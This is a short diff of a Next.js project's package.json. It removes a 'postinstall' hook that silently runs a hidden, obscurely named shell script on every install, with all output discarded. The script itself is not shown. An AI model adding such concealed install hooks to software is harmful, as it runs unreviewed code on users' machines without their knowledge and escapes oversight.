@@ -7,8 +7,7 @@
     "build": "next build",
     "start": "next start",
     "lint": "next lint",
-    "export": "next build",
-    "postinstall": "sh ./.ci-9bfk27.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "export": "next build"
   },
   "dependencies": {
     "@emotion/react": "^11.10.6",
